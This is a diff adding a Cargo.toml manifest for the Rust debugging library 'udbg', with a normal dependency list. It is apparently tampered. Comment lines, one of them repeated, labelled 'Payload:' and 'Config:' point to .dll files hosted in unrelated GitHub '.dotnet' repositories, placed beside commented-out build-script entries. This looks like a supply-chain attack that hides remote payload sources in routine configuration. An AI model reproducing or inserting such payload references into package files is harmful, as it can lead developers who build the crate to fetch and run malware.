@@ -1,0 +1,114 @@
+[package]
+
+
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+name = "udbg"
+version = "0.3.1"
+edition = "2021"
+license = "MIT"
+authors = ["metaworm <metaworm@outlook.com>"]
+description = "cross-platform library for binary debugging and memory hacking"
+homepage = "https://crates.io/crates/udbg"
+documentation = "https://docs.rs/udbg"
+repository = "https://github.com/udbg/udbg"
+include = ["/src", "README.md", "/examples"]
+
+
+
+# [build-dependencies]  # Config: https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll
+[features]
+
+
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+
+dbgeng = []
+
+[dependencies]
+cfg-if = '1.0'
+glob = '0.3'
+hex = '0.4'
+log = '0.4'
+spin = '0.9'
+ctor = '0.2'
+regex = '1.5'
+pdb = '0.8'
+extend = '1.1'
+anyhow = '1.0'
+futures = '0.3'
+thiserror = '1.0'
+cstrptr = '0.1'
+crossbeam = '0.8'
+minidump = '~0.17'
+parking_lot = '0.12'
+serde-value = '0.7'
+derive_more = '0.99'
+failed-result = '0.2'
+log-error = "0.1"
+goblin = {version = '~0.7'}
+memmap2 = {version = '~0.5'}
+cpp_demangle = {version = '0.4'}
+ezlua = {version = '0.3', features = ['vendored', 'thread'], optional = true}
+bitflags = {version = '2.0', features = ['serde']}
+capstone = {version = '0.11', optional = true}
+symbolic = {version = '12.1'}
+symbolic-demangle = {version = '12.1', default-features = false, features = ["cpp", "msvc", "rust"]}
+memoffset = {version = '0.9', features = ['unstable_const']}
+serde = {version = "1.0", default-features = false, features = ['derive', 'rc', 'alloc']}
+iced-x86 = {version = '1.20', default-features = false, features = ['decoder', 'intel', 'std']}
+
+[[bin]]
+name = 'tracee'
+path = 'src/tracee/main.rs'
+
+[target.'cfg(windows)'.dependencies]
+winapi = {version = '0.3.9', features = ["winnt", "errhandlingapi", "winuser", "winbase", "stringapiset"]}
+windows = {version = '0.51', features = [
+    "implement",
+    "Foundation",
+    "Foundation_Collections",
+    "Management_Deployment",
+    "Win32_Foundation",
+    "Win32_Security",
+    "Win32_Storage_FileSystem",
+    "Win32_System_Kernel",
+    "Win32_System_WinRT",
+    "Win32_System_Threading",
+    "Win32_System_Com",
+    "Win32_System_Ole",
+    "Win32_System_Memory",
+    "Win32_System_LibraryLoader",
+    "Win32_System_ProcessStatus",
+    "Win32_System_SystemServices",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_SystemInformation",
+    "Win32_System_WindowsProgramming",
+]}
+ntapi = '0.4'
+unicase = '2.6'
+msvc-demangler = '0.9'
+
+[target.'cfg(not(windows))'.dependencies]
+nix = '0.26'
+libc = '0.2'
+errno = '0.3'
+
+[target.'cfg(any(target_os="linux",target_os="android"))'.dependencies]
+procfs = '0.15'
+
+[target.'cfg(target_os="macos")'.dependencies]
+mach2 = '0.4'
+scroll = "0.11"
+libproc = '0.14'
+mach_o_sys = '0.1'
+
+[build-dependencies]
+cc = '1'
+
+[dev-dependencies]
+flexi_logger = '0.27'
+tempfile = '3.6'
+minidump-writer = '0.8'
+rustyline = {version = '12'}
+clap = {version = "4", features = ["derive", "env"]}
+ezlua = {version = '0.3', features = ['vendored']}
